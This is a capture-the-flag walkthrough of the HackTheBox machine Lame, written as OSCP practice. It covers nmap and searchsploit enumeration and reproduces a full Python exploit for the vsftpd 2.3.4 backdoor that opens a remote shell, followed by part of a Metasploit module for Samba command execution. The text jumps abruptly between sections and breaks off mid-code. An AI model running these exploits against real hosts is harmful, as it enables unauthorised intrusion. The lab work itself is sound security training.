HackTheBox Lame Walkthrough (w/o Metasploit)

Walkthrough of the retired HackTheBox machine, Lame!

Nov 13, 2022
8 minute read

Introduction

Hi! Welcome to my first post on the blog and first HackTheBox walkthrough. I’m currently preparing to take the OSCP certification exam and decided to tackle TJ_Null’s OSCP-like VMs list! Lame is the first Linux box on the list. Since I am doing this in preparation for the OSCP exam where Metasploit usage is restricted, I didn’t use Metasploit while completing this box.

Scanning & Enumeration

Upon launching the machine on HackTheBox, we are given the machine IP 10.10.10.3

I started off by running a quick nmap scan to give myself some leads to start following while waiting for a more intensive scan to run.

1

nmap -Pn 10.10.10.3


From this initial scan, we can see FTP, SSH, and SMB services running.

Next, I ran a more intensive nmap scan in the background while I started my enumeration steps.

1

nmap -Pn -A -v -p- 10.10.10.3


This scan actually ran pretty quickly before I had time to jump into early enumeration. We can see an additional service that we didn’t catch in our early scan, DistCC.

SSH

SSH is unlikely to be our entry point but before we table it, I checked searchsploit for the version we found in our nmap scan (OpenSSH 4.7p1) just in case.

1

searchsploit OpenSSH 4.7p1

Sifting through the results, nothing looks interesting so we can move past SSH for now.

FTP

Next, we will take a look at FTP. We saw in our intensive nmap scan that anonymous login was allowed. Let’s try that.
This didn’t yield anything. Let’s check searchsploit for the version information we found with nmap.

1

searchsploit vsftpd 2.3.4


This looks promising! An RCE with an accompanying Metasploit module. We will add this to our list of things to try. Before we dive right into attempting to exploit this avenue, let’s finish checking out the other services from our scan.

SMB

First, we will enumerate using smbmap.

1

smbmap -H 10.10.10.3


We have access to the /tmp share. Lets try to see what is in it!

1

smbclient -N //10.10.10.3/tmp


None of this looks too interesting.

We also saw in the nmap scan that we are working with SMB 3.0.20. Let’s check searchsploit.

1

searchsploit samba 3.0.20


The seccond listing looks interesting. The version number fits and the entry lists command execution. We will add this to our list of things to try.

DistCC

Finally I checked searchsploit for any distcc exploits.

1

searchsploit distccd 4.2.4


Checking with the version number we found did not return any results, however, checking with just distcc did find an exploit.

1

searchsploit distcc


Not only did it find an exploit, it found an RCE! Since the version number isn’t explicitly present, we don’t have a lot of confidence yet that our system is vulnerable but we will definitely add this to our list of things to try.

Gaining Access

After our scanning and enumeration, we have a list of three potential avenues for gaining an initial foothold:

  1. vsftpd 2.3.4 - Backdoor Command Execution
  2. samba 3.0.20 - ‘Username’ map script’ Command Execution
  3. DistCC Daemon - Command Execution

vsftpd 2.3.4 - Backdoor Command Execution

Let’s start with the FTP exploit. Since I am doing this lab in preparation for the OSCP exam which restricts the use of Metasploit, I will check out the python exploit listed in searchsploit instead of the Metasploit module.

# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3

from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)
parser=argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()
host = args.host
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()

It appears that in this version of vsftpd, including a “:)” in the username opens a backdoor on port 6200 in the form of a bind shell port. The exploit connects to the vsftpd service with telnet, submits a username including “:)”, and then checks if port 6200 has been opened. Let’s try running the exploit.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::SMB

        # For our customized version of session_setup_ntlmv1
        CONST = Rex::Proto::SMB::Constants
        CRYPT = Rex::Proto::SMB::Crypt

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Samba "username map script" Command Execution',
                        'Description'    => %q{
                                        This module exploits a command execution vulerability in Samba
                                versions 3.0.20 through 3.0.25rc3 when using the non-default
                                "username map script" configuration option. By specifying a username
                                containing shell meta characters, attackers can execute arbitrary
                                commands.

                                No authentication is needed to exploit this vulnerability since
                                this option is used to map usernames prior to authentication!
                        },
                        'Author'         => [ 'jduck' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 10040 $',
                        'References'     =>
                                [
                                        [ 'CVE', '2007-2447' ],
                                        [ 'OSVDB', '34700' ],
                                        [ 'BID', '23972' ],

                                        [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
                                ],
                        'Platform'       => ['unix'],
                        'Arch'           => ARCH_CMD,
                        'Privileged'     => true, # root or nobody user
                        'Payload'        =>
                                {
                                        'Space'    => 1024,
                                        'DisableNops' => true,
                                        'Compat'      =>
                                                {
                                                        'PayloadType' => 'cmd',
                                                        # *_perl and *_ruby work if they are installed

                                                }
                                },

                        ], self.class)
        end


        def exploit

                connect
